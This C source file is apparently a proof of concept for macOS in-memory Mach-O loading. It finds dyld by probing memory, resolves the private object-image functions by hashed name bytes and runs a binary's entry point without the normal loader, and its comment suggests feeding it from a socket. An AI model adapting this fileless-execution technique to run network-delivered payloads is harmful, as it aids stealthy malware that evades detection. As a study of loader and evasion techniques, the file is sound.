#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#define EXECUTABLE_BASE_ADDR 0x100000000
#define DYLD_BASE 0x00007fff5fc00000

int IS_SIERRA = -1;

int is_sierra(void) {
	if(IS_SIERRA == -1) {
		struct stat statbuf;
		IS_SIERRA = (stat("/bin/rcp", &statbuf) != 0);
	}
	return IS_SIERRA;
}

int find_macho(unsigned long addr, unsigned long *base) {
	*base = 0;

	while(1) {
		chmod((char *)addr, 0777);
		if(errno == 2 /*ENOENT*/ &&
			((int *)addr)[0] == 0xfeedfacf /*MH_MAGIC_64*/) {
			*base = addr;
			return 0;
		}

		addr += 0x1000;
	}
	return 1;
}

int find_epc(unsigned long base, struct entry_point_command **entry) {

	struct mach_header_64 *mh;
	struct load_command *lc;

	unsigned long text = 0;

	*entry = NULL;

	mh = (struct mach_header_64 *)base;
	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
	for(int i=0; i<mh->ncmds; i++) {
		if(lc->cmd == LC_MAIN) {	//0x80000028
			*entry = (struct entry_point_command *)lc;
			return 0;
		}

		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
	}

	return 1;
}

unsigned long resolve_symbol(unsigned long base, unsigned int offset, unsigned int match) {
	struct load_command *lc;
	struct segment_command_64 *sc, *linkedit, *text;
	struct symtab_command *symtab;
	struct nlist_64 *nl;

	char *strtab;

	symtab = 0;
	linkedit = 0;
	text = 0;

	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
	for(int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
		if(lc->cmd == 0x2/*LC_SYMTAB*/) {
			symtab = (struct symtab_command *)lc;
		} else if(lc->cmd == 0x19/*LC_SEGMENT_64*/) {
			sc = (struct segment_command_64 *)lc;
			switch(*((unsigned int *)&((struct segment_command_64 *)lc)->segname[2])) { //skip __
			case 0x4b4e494c:	//LINK
				linkedit = sc;
				break;
			case 0x54584554:	//TEXT
				text = sc;
				break;
			}
		}
		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
	}

	if(!linkedit || !symtab || !text) return -1;

	unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
	strtab = (char *)(base + file_slide + symtab->stroff);

	nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
	for(int i=0; i<symtab->nsyms; i++) {
		char *name = strtab + nl[i].n_un.n_strx;
		if(*(unsigned int *)&name[offset] == match) {
			if(is_sierra()) {
				return base + nl[i].n_value;
			} else {
				return base - DYLD_BASE + nl[i].n_value;
			}
		}
	}

	return -1;
}

int load_from_disk(char *filename, char **buf, unsigned int *size) {
	/*
	 What, you say?  this isn't running from memory!  You're loading from disk!!

	 Put down the pitchforks, please.  Yes, this reads a binary from disk...into 
	 memory.  The code is then executed from memory.  This here is a POC; in
	 real life you would probably want to read into buf from a socket. 
	 */
	int fd;
	struct stat s;

	if((fd = open(filename, O_RDONLY)) == -1) return 1;
	if(fstat(fd, &s)) return 1;
	
	*size = s.st_size;

	if((*buf = mmap(NULL, (*size) * sizeof(char), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0)) == MAP_FAILED) return 1;
	if(read(fd, *buf, *size * sizeof(char)) != *size) {
		free(*buf);
		*buf = NULL;
		return 1;
	}

	close(fd);

	return 0;
}

int load_and_exec(char *filename, unsigned long dyld) {
	char *binbuf = NULL;
	unsigned int size;
	unsigned long addr;

	NSObjectFileImageReturnCode(*create_file_image_from_memory)(const void *, size_t, NSObjectFileImage *) = NULL;
	NSModule (*link_module)(NSObjectFileImage, const char *, unsigned long) = NULL;

	//resolve symbols
	addr = resolve_symbol(dyld, 25, 0x4d6d6f72);
	if(addr == -1) {
		fprintf(stderr, "Could not resolve symbol: _sym[25] == 0x4d6d6f72.\n");
		goto err;
	}
	create_file_image_from_memory = (NSObjectFileImageReturnCode (*)(const void *, size_t, NSObjectFileImage *)) addr;

	addr = resolve_symbol(dyld, 4, 0x4d6b6e69);
	if(addr == -1) {
		fprintf(stderr, "Could not resolve symbol: _sym[4] == 0x4d6b6e69.\n");
		goto err;
	}
	link_module = (NSModule (*)(NSObjectFileImage, const char *, unsigned long)) addr;

	if(load_from_disk(filename, &binbuf, &size)) goto err;

	int type = ((int *)binbuf)[3];
	if(type != 0x8) ((int *)binbuf)[3] = 0x8; //change to mh_bundle type

	//create file image
	NSObjectFileImage fi; 
	if(create_file_image_from_memory(binbuf, size, &fi) != 1) {
		fprintf(stderr, "Could not create image.\n");
		goto err;
	}

	NSModule nm = link_module(fi, "mytest", NSLINKMODULE_OPTION_PRIVATE |
						                NSLINKMODULE_OPTION_BINDNOW);
	if(!nm) {
		fprintf(stderr, "Could not link image.\n");
		goto err;
	}

	if(type == 0x2) { //mh_execute
		unsigned long execute_base = *(unsigned long *)((unsigned long)nm + (is_sierra() ? 0x50 : 0x48));
		struct entry_point_command *epc;

		if(find_epc(execute_base, &epc)) {
			fprintf(stderr, "Could not find ec.\n");
			goto err;
		}

		int(*main)(int, char**, char**, char**) = (int(*)(int, char**, char**, char**))(execute_base + epc->entryoff); 
		char *argv[]={"test", NULL};
		int argc = 1;
		char *env[] = {NULL};
		char *apple[] = {NULL};
		return main(argc, argv, env, apple);
	}	
err:
	if(binbuf) free(binbuf);
	return 1;
}

int main(int ac, char **av) {
	
	if(ac != 2) {
		fprintf(stderr, "usage: %s <filename>\n", av[0]);
		exit(1);
	}

	unsigned long binary, dyld; 

	if(is_sierra()) {
		if(find_macho(EXECUTABLE_BASE_ADDR, &binary)) return 1;
		if(find_macho(binary + 0x1000, &dyld)) return 1;
	} else {
		if(find_macho(DYLD_BASE, &dyld)) return 1;
	}

	return load_and_exec(av[1], dyld);
}
